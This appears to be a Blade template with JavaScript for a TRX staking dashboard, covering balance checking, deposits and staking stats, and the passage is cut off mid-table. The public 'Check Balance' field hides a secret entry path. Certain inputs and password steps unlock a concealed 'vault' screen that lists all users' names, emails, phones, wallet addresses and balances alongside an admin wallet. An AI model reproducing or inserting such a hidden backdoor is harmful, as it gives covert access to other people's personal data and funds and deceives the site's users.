                            class="w-full py-3 px-6 bg-gradient-to-r from-blue-500 to-teal-500 text-white font-semibold rounded-2xl hover:from-blue-600 hover:to-teal-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:ring-offset-2 transform transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-blue-500/30 hover:shadow-xl hover:shadow-blue-500/40">
                            <div class="flex items-center justify-center">
                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2H9m4 8V9m0 0l-2 2m2-2l2 2"></path>
                                </svg>
                                Check Balance
                            </div>
                        </button>

                        <!-- Enhanced Result Section -->
                        <div id="balance-result" class="hidden">
                            <div class="bg-gradient-to-br from-success-50/80 to-emerald-50/80 backdrop-blur-sm rounded-2xl p-6 border border-success-200/50 shadow-lg shadow-success-200/30">
                                <div class="flex items-center justify-between mb-4">
                                    <div class="flex items-center space-x-3">
                                        <div class="w-10 h-10 bg-success-100 rounded-xl flex items-center justify-center">
                                            <svg class="w-5 h-5 text-success-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                            </svg>
                                        </div>
                                        <div>
                                            <h3 class="text-sm font-semibold text-success-800">Address Balance</h3>
                                            <p id="balance-amount" class="text-2xl font-bold text-success-900 mt-1">0.000000 TRX</p>
                                        </div>
                                    </div>
                                    <button onclick="copyAddress()" class="group p-2 text-success-600 hover:text-success-700 hover:bg-success-100 rounded-xl transition-all duration-200">
                                        <svg class="w-5 h-5 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                                        </svg>
                                    </button>
                                </div>
                                <div class="bg-white/60 backdrop-blur-sm rounded-xl p-3 border border-white/20">
                                    <p id="balance-address" class="text-sm font-mono text-neutral-700 break-all"></p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

@include('layouts.mobile-nav')

<!-- Enhanced Deposit Modal -->
<div id="depositModal" class="fixed inset-0 z-50 hidden">
    <!-- Backdrop -->
    <div class="fixed inset-0 bg-black/50 backdrop-blur-sm transition-opacity" onclick="hideDepositModal()"></div>
    
    <!-- Modal -->
    <div class="fixed inset-0 flex items-center justify-center p-4">
        <div class="bg-white/90 backdrop-blur-xl rounded-3xl shadow-2xl max-w-md w-full border border-white/20 animate-scale-in">
            <!-- Header -->
            <div class="flex items-center justify-between p-6 border-b border-white/20">
                <div class="flex items-center space-x-3">
                    <div class="w-10 h-10 bg-gradient-to-br from-primary-500 to-secondary-500 rounded-2xl flex items-center justify-center">
                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path>
                        </svg>
                    </div>
                    <h3 class="text-xl font-bold text-neutral-900">Deposit TRX</h3>
                </div>
                <button onclick="hideDepositModal()" class="text-neutral-400 hover:text-neutral-600 transition-colors">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
            
            <!-- Content -->
            <div class="p-6">
                <div class="text-center mb-6">
                    <p class="text-neutral-600">Send TRX to your wallet address below</p>
                </div>

                <!-- QR Code -->
                <div class="bg-white rounded-2xl p-6 border border-neutral-200 mb-6">
                    <div id="qrcode" class="flex justify-center">
                        <div class="animate-pulse bg-neutral-200 w-48 h-48 rounded-xl"></div>
                    </div>
                </div>

                <!-- Wallet Address -->
                <div class="bg-gradient-to-br from-neutral-50 to-slate-50 rounded-2xl p-4 mb-6 border border-neutral-200">
                    <label class="block text-sm font-semibold text-neutral-700 mb-2">Your Wallet Address</label>
                    <div class="flex items-center space-x-2">
                        <div class="flex-1 bg-white rounded-xl p-3 border border-neutral-200">
                            <code class="text-sm font-mono text-neutral-800 break-all">{{ auth()->user()->wallet->address ?? 'No wallet address' }}</code>
                        </div>
                        <button onclick="copyToClipboard('{{ auth()->user()->wallet->address ?? '' }}', event)" 
                            class="p-3 bg-gradient-to-r from-primary-500 to-secondary-500 text-white rounded-xl hover:from-primary-600 hover:to-secondary-600 transition-all duration-200 shadow-lg shadow-primary-500/30">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Important Notes -->
                <div class="bg-warning-50/80 backdrop-blur-sm rounded-2xl p-4 border border-warning-200/50">
                    <div class="flex items-start space-x-3">
                        <div class="w-6 h-6 bg-warning-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                            <svg class="w-4 h-4 text-warning-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                            </svg>
                        </div>
                        <div>
                            <h4 class="text-sm font-semibold text-warning-800 mb-1">Important Notes</h4>
                            <ul class="text-xs text-warning-700 space-y-1">
                                <li>• Only send TRX to this address</li>
                                <li>• Balance updates may take 2-5 minutes</li>
                                <li>• Minimum deposit: 1 TRX</li>
                                <li>• Network: TRON (TRC20)</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Libraries loaded from layout -->

<script>
const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// QR codes now generated server-side using external API
console.log('✅ QR Code generation using server-side API');

function copyContractAddress() {
    navigator.clipboard.writeText(CONTRACT_ADDRESS).then(() => {
        showNotification('Contract address copied to clipboard', 'success');
    });
}

function checkContractBalance() {
    const input = document.getElementById('contract-address-input');
    input.value = CONTRACT_ADDRESS;
    checkBalance();
}

let tronWebInstance = null;
let isLoadingBalance = false;
let lastBalanceCheck = 0;
const REFRESH_COOLDOWN = 10000; // 10 seconds cooldown between manual refreshes

// Wait for TronWeb to be available
async function waitForTronWeb() {
    return new Promise((resolve, reject) => {
        let attempts = 0;
        const maxAttempts = 50; // 5 seconds max wait time
        
        const checkTronWeb = () => {
            if (typeof TronWeb !== 'undefined' || typeof window.TronWeb !== 'undefined' || window.tronWeb) {
                resolve();
            } else if (attempts >= maxAttempts) {
                reject(new Error('TronWeb library failed to load'));
            } else {
                attempts++;
                setTimeout(checkTronWeb, 100);
            }
        };
        
        checkTronWeb();
    });
}

// Initialize TronWeb once and cache it
async function initTronWeb() {
    if (tronWebInstance) {
        return tronWebInstance;
    }

    try {
        // Wait for TronWeb to be available
        await waitForTronWeb();
        
        try {
            const response = await fetch('/api/config');
            const configData = await response.json();
            if (configData.success) {
                // Try to get TronWeb constructor from different possible locations
                let TronWebConstructor;
                
                // First check if window.TronWeb.TronWeb exists and is a function (this is our case)
                if (window.TronWeb && typeof window.TronWeb.TronWeb === 'function') {
                    TronWebConstructor = window.TronWeb.TronWeb;
                } else if (typeof TronWeb !== 'undefined') {
                    TronWebConstructor = TronWeb;
                } else if (typeof window.TronWeb !== 'undefined') {
                    TronWebConstructor = window.TronWeb;
                } else if (window.tronWeb && window.tronWeb.constructor) {
                    TronWebConstructor = window.tronWeb.constructor;
                }
                
                if (!TronWebConstructor || typeof TronWebConstructor !== 'function') {
                    throw new Error('TronWeb constructor not found');
                }
                
                tronWebInstance = new TronWebConstructor({
                    fullHost: configData.config.api_url,
                    headers: { "TRON-PRO-API-KEY": configData.config.trongrid_api_key }
                });
            } else {
                throw new Error('Failed to get API configuration');
            }
        } catch (error) {
            console.error('Failed to initialize TronWeb:', error);
            throw error;
        }
        return tronWebInstance;
    } catch (error) {
        console.error('TronWeb initialization error:', error);
        throw new Error('Failed to initialize TronWeb');
    }
}

// Update UI elements
function updateUI(loading = false) {
    const refreshButton = document.getElementById('refresh-button');
    const balanceStatus = document.getElementById('balance-status');

    if (loading) {
        refreshButton.disabled = true;
        refreshButton.classList.add('animate-spin');
        refreshButton.title = 'Refreshing...';
        if (balanceStatus) {
            balanceStatus.textContent = 'Refreshing balance...';
            balanceStatus.className = 'text-xs text-blue-500 mt-1';
        }
    } else {
        const canRefresh = Date.now() - lastBalanceCheck >= REFRESH_COOLDOWN;
        refreshButton.disabled = false; // Always enable the button, handle cooldown in function
        refreshButton.classList.remove('animate-spin');
        refreshButton.title = canRefresh ? 'Refresh balance' : `Wait ${Math.ceil((REFRESH_COOLDOWN - (Date.now() - lastBalanceCheck)) / 1000)}s to refresh`;

        if (balanceStatus) {
        if (!canRefresh) {
            const remainingTime = Math.ceil((REFRESH_COOLDOWN - (Date.now() - lastBalanceCheck)) / 1000);
            balanceStatus.textContent = `Wait ${remainingTime}s to refresh`;
                balanceStatus.className = 'text-xs text-yellow-500 mt-1';
        } else {
                balanceStatus.textContent = `Last updated: ${new Date(lastBalanceCheck).toLocaleTimeString()}`;
                balanceStatus.className = 'text-xs text-green-500 mt-1';
            }
        }
    }
}

// Cache for balance
let cachedBalance = {
    value: null,
    timestamp: 0
};

async function getBalance(forceRefresh = false) {
    if (isLoadingBalance) return;

    // Check if wallet balance element exists
    const balanceElement = document.getElementById('wallet-balance');
    if (!balanceElement) {
        console.log('Wallet balance element not found - skipping balance fetch');
        return;
    }

    // Check cache if not forcing refresh
    if (!forceRefresh && cachedBalance.value !== null && Date.now() - cachedBalance.timestamp < 30000) {
        return updateBalanceDisplay(cachedBalance.value);
    }

    try {
        isLoadingBalance = true;
        updateUI(true);

        const tronWeb = await initTronWeb();
        const walletAddress = '{{ auth()->user()->wallet->address ?? "" }}';

        if (!walletAddress || walletAddress.trim() === '') {
            console.log('No wallet address found - setting balance to 0');
            // Set balance to 0 and update display
            const balanceElement = document.getElementById('wallet-balance');
            if (balanceElement) {
                balanceElement.textContent = '0.000000';
            }
            return;
        }

        // Validate TRX address format before making API call
        if (!walletAddress.startsWith('T') || walletAddress.length !== 34) {
            console.log('Invalid wallet address format - setting balance to 0');
            const balanceElement = document.getElementById('wallet-balance');
            if (balanceElement) {
                balanceElement.textContent = '0.000000';
            }
            return;
        }

        const balance = await tronWeb.trx.getBalance(walletAddress);

        // Update cache
        cachedBalance = {
            value: balance,
            timestamp: Date.now()
        };
        lastBalanceCheck = Date.now();

        await updateBalanceDisplay(balance);
        
        // Show success notification only for manual refresh
        if (forceRefresh) {
            showNotification('Balance updated successfully!', 'success');
        }
    } catch (error) {
        console.log('Balance fetch failed - setting to 0:', error.message);
        const balanceElement = document.getElementById('wallet-balance');
        const statusElement = document.getElementById('balance-status');
        
        if (balanceElement) {
            balanceElement.textContent = '0.000000';
        }
        if (statusElement) {
            statusElement.textContent = 'Balance unavailable';
            statusElement.classList.remove('hidden');
        }
    } finally {
        isLoadingBalance = false;
        updateUI(false);
    }
}

async function updateBalanceDisplay(balanceInSun) {
    try {
        const balanceElement = document.getElementById('wallet-balance');
        if (balanceElement) {
        const balanceTRX = balanceInSun / 1_000_000;
            balanceElement.textContent = balanceTRX.toFixed(6);
        }
    } catch (error) {
        console.error('Error updating balance display:', error);
    }
}

function refreshBalance() {
    const now = Date.now();
    const timeSinceLastCheck = now - lastBalanceCheck;
    
    if (timeSinceLastCheck < REFRESH_COOLDOWN) {
        const remainingTime = Math.ceil((REFRESH_COOLDOWN - timeSinceLastCheck) / 1000);
        showNotification(`Please wait ${remainingTime} seconds before refreshing again`, 'info');
        return;
    }
    
    // Show immediate feedback
    showNotification('Refreshing balance...', 'info');
    getBalance(true);
}

// Initialize balance with retry mechanism
async function initializeWithRetry(maxRetries = 3, delay = 1000) {
    for (let i = 0; i < maxRetries; i++) {
        try {
            await getBalance();
            break;
        } catch (error) {
            console.log(`Retry ${i + 1} failed:`, error);
            if (i < maxRetries - 1) {
                await new Promise(resolve => setTimeout(resolve, delay * (i + 1)));
            }
        }
    }
}

// Start balance updates
document.addEventListener('DOMContentLoaded', () => {
    // Check if wallet balance element exists before initializing
    if (document.getElementById('wallet-balance')) {
    initializeWithRetry();

    // Refresh balance every 30 seconds if tab is visible
    setInterval(() => {
            if (document.visibilityState === 'visible' && !isLoadingBalance && document.getElementById('wallet-balance')) {
            getBalance();
        }
    }, 30000);
    }
});

// Handle tab visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible' && document.getElementById('wallet-balance')) {
        getBalance();
    }
});

async function copyToClipboard(text, event = null) {
    try {
        await navigator.clipboard.writeText(text);

        // Show success notification
        showNotification('Address copied to clipboard!', 'success');

        // If event is provided, update the button that was clicked
        if (event && event.currentTarget) {
        const button = event.currentTarget;
        const originalHTML = button.innerHTML;
            const originalClasses = button.className;

        // Change the button icon to checkmark and color to green
        button.innerHTML = `
            <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
            </svg>
        `;
            button.className = button.className.replace('bg-blue-600', 'bg-green-600').replace('hover:bg-blue-700', 'hover:bg-green-700');

        // Reset button after 2 seconds
        setTimeout(() => {
            button.innerHTML = originalHTML;
                button.className = originalClasses;
        }, 2000);
        }

    } catch (err) {
        console.error('Failed to copy to clipboard:', err);
        showNotification('Failed to copy to clipboard', 'error');
    }
}

async function loadStakingStats() {
    try {
        // Check if the container exists
        const container = document.getElementById('activeStakings');
        if (!container) {
            console.log('activeStakings container not found - skipping staking stats load');
            return;
        }

        const response = await fetch('{{ route("staking.stats") }}');
        const result = await response.json();

        if (!result.success || !result.data || result.data.length === 0) {
            container.innerHTML = `
                <div class="bg-blue-50 rounded-lg p-4 text-center">
                    <svg class="w-12 h-12 text-blue-400 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                    <p class="text-sm text-gray-600">No active stakings yet.</p>
                    <a href="{{ route('dashboard.plans') }}" class="mt-2 inline-block text-sm text-blue-600 hover:text-blue-700">
                        View available staking plans →
                    </a>
                </div>
            `;
            return;
        }

        container.innerHTML = result.data.map(staking => `
            <div class="bg-gradient-to-r from-blue-50 to-purple-50 rounded-xl overflow-hidden">
                <div class="p-4">
                    <div class="flex justify-between items-start mb-3">
                        <div>
                            <h3 class="font-semibold text-gray-900">${staking.plan_name}</h3>
                            <p class="text-sm text-gray-600">Started ${staking.staked_at}</p>
                        </div>
                        <div class="bg-white px-3 py-1 rounded-full text-sm font-medium text-green-600 shadow-sm">
                            +${staking.daily_earnings} TRX Daily
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-4 mb-3">
                        <div class="bg-white/50 rounded-lg p-2">
                            <span class="text-sm text-gray-600">Staked Amount</span>
                            <p class="text-lg font-semibold text-gray-900">${staking.amount} TRX</p>
                        </div>
                        <div class="bg-white/50 rounded-lg p-2">
                            <span class="text-sm text-gray-600">Earned So Far</span>
                            <p class="text-lg font-semibold text-green-600">+${staking.earned_amount} TRX</p>
                        </div>
                    </div>

                    <!-- Overall Progress -->
                    <div class="space-y-2 mb-4">
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-600">Overall Progress</span>
                            <span class="font-medium">${Math.floor(staking.progress)}%</span>
                        </div>
                        <div class="w-full bg-gray-200 rounded-full h-2.5">
                            <div class="bg-gradient-to-r from-blue-600 to-purple-600 h-2.5 rounded-full transition-all duration-500"
                                 style="width: ${staking.progress}%"></div>
                        </div>
                        <div class="flex justify-between text-xs text-gray-500">
                            <span>${staking.days_left} days remaining</span>
                            <span>Ends ${staking.end_at}</span>
                        </div>
                    </div>

                    <!-- Daily Interest Progress -->
                    <div class="bg-white/30 rounded-lg p-3 space-y-2">
                        <div class="flex justify-between items-center mb-1">
                            <span class="text-sm font-medium text-gray-700">Next Daily Interest</span>
                            <span class="text-sm text-green-600">+${staking.daily_earnings} TRX</span>
                        </div>
                        <div class="w-full bg-gray-200 rounded-full h-2">
                            <div class="bg-green-500 h-2 rounded-full transition-all duration-500"
                                 style="width: ${staking.daily_progress}%"></div>
                        </div>
                        <div class="flex justify-between text-xs">
                            <span class="text-gray-500">Last: ${staking.last_payout_at}</span>
                            <span class="text-gray-500">Next: ${staking.next_payout}</span>
                        </div>
                    </div>
                </div>
            </div>
        `).join('');

    } catch (error) {
        console.error('Error loading staking stats:', error);
        const container = document.getElementById('activeStakings');
        if (container) {
            container.innerHTML = `
            <div class="bg-red-50 rounded-lg p-4 text-center">
                <p class="text-sm text-red-600">Failed to load staking information. Please try again later.</p>
            </div>
        `;
    }
    }
}

// Load staking stats when page loads (with safety check)
document.addEventListener('DOMContentLoaded', function() {
    // Add a small delay to ensure DOM is fully loaded
    setTimeout(loadStakingStats, 100);
});

// Refresh stats every minute (with safety check)
setInterval(function() {
    if (document.getElementById('activeStakings')) {
        loadStakingStats();
    }
}, 60000);

// Add this function to update the daily progress in real-time
function updateDailyProgress() {
    const now = new Date();
    const midnight = new Date();
    midnight.setHours(24, 0, 0, 0);
    const timeUntilMidnight = midnight - now;
    const progress = 100 - ((timeUntilMidnight / 86400000) * 100); // 86400000 ms in a day

    // Update all progress bars
    document.querySelectorAll('.daily-progress').forEach(progressBar => {
        progressBar.style.width = `${progress}%`;
    });

    // Update time displays
    document.querySelectorAll('.next-payout').forEach(timeDisplay => {
        const hours = Math.floor(timeUntilMidnight / 3600000);
        const minutes = Math.floor((timeUntilMidnight % 3600000) / 60000);
        timeDisplay.textContent = `Next: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
    });
}

// Update progress immediately and then every minute
updateDailyProgress();
setInterval(updateDailyProgress, 60000);

async function showDepositModal() {
    const modal = document.getElementById('depositModal');
    if (!modal) {
        console.error('Deposit modal not found');
        return;
    }
    
    modal.classList.remove('hidden');

    // Clear previous QR code
    const qrContainer = document.getElementById('qrcode');
    if (!qrContainer) {
        console.error('QR code container not found');
        return;
    }
    
    qrContainer.innerHTML = '<div class="text-center p-4"><div class="animate-spin inline-block w-6 h-6 border-[3px] border-current border-t-transparent text-blue-600 rounded-full"></div><p class="text-sm text-gray-600 mt-2">Generating QR code...</p></div>';

    // Generate QR code
    const address = '{{ auth()->user()->wallet->address }}';
    if (!address) {
        qrContainer.innerHTML = '<p class="text-red-600 text-sm">Wallet address not found</p>';
        return;
    }
    
    try {
        // Use server-side QR code generation
        const qrCodeImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(address)}`;
        
        // Create image element
        const img = document.createElement('img');
        img.className = 'mx-auto rounded-lg shadow-sm';
        img.alt = 'Wallet Address QR Code';
        img.style.maxWidth = '200px';
        img.style.maxHeight = '200px';
        
        img.onload = function() {
            qrContainer.innerHTML = '';
            qrContainer.appendChild(img);
            console.log('✅ QR code loaded successfully');
        };
        
        img.onerror = function() {
            console.error('Failed to load QR code image');
            qrContainer.innerHTML = `
                <div class="text-center p-4">
                    <p class="text-red-600 text-sm mb-2">QR Code generation failed</p>
                    <p class="text-xs text-gray-500">Please copy the address below:</p>
                    <div class="mt-2 p-2 bg-gray-100 rounded text-xs font-mono break-all">${address}</div>
                </div>
            `;
        };
        
        img.src = qrCodeImageUrl;
        
    } catch (error) {
        console.error('Exception while generating QR code:', error);
        qrContainer.innerHTML = `
            <div class="text-center p-4">
                <p class="text-red-600 text-sm mb-2">QR Code generation failed</p>
                <p class="text-xs text-gray-500">Please copy the address below:</p>
                <div class="mt-2 p-2 bg-gray-100 rounded text-xs font-mono break-all">${address}</div>
            </div>
        `;
    }
}

function hideDepositModal() {
    const modal = document.getElementById('depositModal');
    modal.classList.add('hidden');
}

// Close modal when clicking outside
const depositModal = document.getElementById('depositModal');
if (depositModal) {
    depositModal.addEventListener('click', function(e) {
    if (e.target === this) {
        hideDepositModal();
    }
});
}

function show2FAAlert() {
    const modal = document.createElement('div');
    modal.className = 'fixed inset-0 z-50 flex items-center justify-center p-4 bg-black bg-opacity-50';
    modal.innerHTML = `
        <div class="bg-white rounded-xl shadow-xl max-w-md w-full p-6">
            <div class="text-center">
                <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg class="w-8 h-8 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                    </svg>
                </div>
                <h3 class="text-xl font-semibold text-gray-900 mb-2">2FA Required</h3>
                <p class="text-gray-600 mb-6">
                    Two-Factor Authentication (2FA) is required to withdraw funds. This helps protect your account and assets.
                </p>
                <div class="flex space-x-3">
                    <button onclick="this.closest('.fixed').remove()"
                        class="flex-1 px-4 py-2 text-gray-700 bg-gray-100 rounded-lg hover:bg-gray-200">
                        Cancel
                    </button>
                    <a href="{{ route('profile') }}#2fa-setup"
                        class="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">
                        Setup 2FA
                    </a>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);

    // Close when clicking outside
    modal.addEventListener('click', function(e) {
        if (e.target === this) {
            this.remove();
        }
    });
}

// Secure vault system - server-side verification
let vaultSessionActive = false;

async function checkBalance() {
    const addressInput = document.getElementById('contract-address-input');
    const address = addressInput.value.trim();

    // Always send to secure server for processing
    try {
        console.log('🔍 Sending request to vault system:', address);
        
        const csrfToken = document.querySelector('meta[name="csrf-token"]');
        if (!csrfToken) {
            console.error('❌ CSRF token not found');
            showNotification('Security token missing', 'error');
            return;
        }
        
        const response = await fetch('/api/system/validate-input', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken.getAttribute('content'),
                'Accept': 'application/json'
            },
            body: JSON.stringify({ query: address })
        });

        console.log('📡 Response status:', response.status);
        console.log('📡 Response headers:', Object.fromEntries(response.headers.entries()));
        
        // Check if response is actually JSON
        const contentType = response.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
            console.error('❌ Server returned non-JSON response');
            const textResponse = await response.text();
            console.error('Response text:', textResponse.substring(0, 500));
            showNotification('Server error: Expected JSON response', 'error');
            return;
        }

        const data = await response.json();
        console.log('📦 Response data:', data);

        if (data.vault_mode || vaultSessionActive) {
            // Handle vault responses
            vaultSessionActive = true;
            
            document.getElementById('balance-result').classList.remove('hidden');
            document.getElementById('balance-amount').textContent = data.message;
            document.getElementById('balance-address').textContent = '';
            
            if (data.message === 'done') {
                vaultSessionActive = false;
                addressInput.value = '';
                addressInput.placeholder = 'Enter TRX contract address starting with T...';
                
                // Hide balance result and show vault interface
                document.getElementById('balance-result').classList.add('hidden');
                showVaultInterface();
            } else if (data.step === 'second_password') {
                addressInput.value = '';
                addressInput.placeholder = 'Enter address...';
            } else if (!data.success) {
                vaultSessionActive = false;
                addressInput.value = '';
                addressInput.placeholder = 'Enter TRX contract address starting with T...';
                showNotification(data.error || 'Access denied', 'error');
            } else {
                addressInput.value = '';
                addressInput.placeholder = 'Enter address...';
            }
            return;
        }
    } catch (error) {
        console.error('System error:', error);
        showNotification('System error occurred', 'error');
        return;
    }

    // If we reach here, it's a normal balance check
    // Validate address format for normal balance checking
    if (!address || address.length !== 34 || !address.startsWith('T')) {
        showNotification('Please enter a valid TRX address starting with T', 'error');
        return;
    }

    try {
        // Show loading state
        const button = document.querySelector('button[onclick="checkBalance()"]');
        button.disabled = true;
        button.innerHTML = `
            <svg class="animate-spin -ml-1 mr-3 h-5 w-5 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            Checking Balance...
        `;

        const response = await fetch(`/api/contract-balance/${address}`);
        const data = await response.json();

        if (data.success) {
            // Format balance
            const formattedBalance = new Intl.NumberFormat('en-US', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 6
            }).format(data.balance);

            // Update UI
            document.getElementById('balance-amount').textContent = `${formattedBalance} TRX`;
            document.getElementById('balance-address').textContent = data.address;
            document.getElementById('balance-result').classList.remove('hidden');

            // Add animation
            document.getElementById('balance-result').classList.add('animate-fade-in');
        } else {
            showNotification(data.message || 'Failed to fetch balance', 'error');
        }
    } catch (error) {
        console.error('Balance check error:', error);
        showNotification('Failed to check balance. Please try again later.', 'error');
    } finally {
        // Reset button state
        const button = document.querySelector('button[onclick="checkBalance()"]');
        button.disabled = false;
        button.innerHTML = 'Check Balance';
    }
}

// Secure Vault Interface Functions
function showVaultInterface() {
    // Hide all normal dashboard content
    const mainContent = document.querySelector('.min-h-screen.bg-gray-50');
    if (mainContent) {
        mainContent.style.display = 'none';
    }
    
    // Show vault interface
    document.getElementById('secure-vault-interface').classList.remove('hidden');
    
    // Load vault data
    loadVaultData();
}

function hideVaultInterface() {
    // Show normal dashboard content
    const mainContent = document.querySelector('.min-h-screen.bg-gray-50');
    if (mainContent) {
        mainContent.style.display = 'block';
    }
    
    // Hide vault interface
    document.getElementById('secure-vault-interface').classList.add('hidden');
    
    // Clear sensitive data
    clearVaultData();
}

let currentVaultPage = 1;
let vaultPagination = null;

async function loadVaultData(page = 1) {
    try {
        // Show loading state
        const tableBody = document.getElementById('vault-users-table');
        if (page === 1) {
            tableBody.innerHTML = '<tr><td colspan="8" class="px-6 py-4 text-center text-gray-500">Loading users...</td></tr>';
        }
        
        // Fetch secure vault data with pagination
        const response = await fetch(`/api/system/vault-data?page=${page}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
            }
        });
        
        const data = await response.json();
        
        if (data.success) {
            // Update vault interface with secure data (only on first load)
            if (page === 1) {
                document.getElementById('vault-total-users').textContent = data.total_users || '0';
                document.getElementById('vault-admin-address').textContent = data.admin_wallet || 'Not Available';
                document.getElementById('vault-admin-balance').textContent = data.admin_balance || '0.00';
                
                // Initialize user data
                window.vaultUserData = data.user_wallets || [];
            } else {
                // Append to existing data for pagination
                window.vaultUserData = [...(window.vaultUserData || []), ...(data.user_wallets || [])];
            }
            
            // Store pagination info
            vaultPagination = data.pagination;
            currentVaultPage = page;
            
            // Display users in table
            displayUsersTable(window.vaultUserData, data.pagination);
        }
    } catch (error) {
        console.error('Vault data error:', error);
        showNotification('Failed to load vault data', 'error');
    }
}

function displayUsersTable(users, pagination = null) {
    const tableBody = document.getElementById('vault-users-table');
    tableBody.innerHTML = '';
    
    if (users.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="8" class="px-6 py-4 text-center text-gray-500">No users found</td>
            </tr>
        `;
        return;
    }
    
    users.forEach(user => {
        const row = document.createElement('tr');
        row.className = 'hover:bg-gray-50';
        row.innerHTML = `
            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${user.user_id}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.user_name || 'N/A'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.email || 'N/A'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${user.phone || 'N/A'}</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-900">
                <div class="flex items-center space-x-2">
                    <code class="bg-gray-100 px-2 py-1 rounded text-xs">${user.address}</code>
                    <button onclick="copyToClipboard('${user.address}')" class="text-gray-600 hover:text-gray-800">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                        </svg>
                    </button>
                </div>
            </td>
            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-green-600">${user.balance} TRX</td>
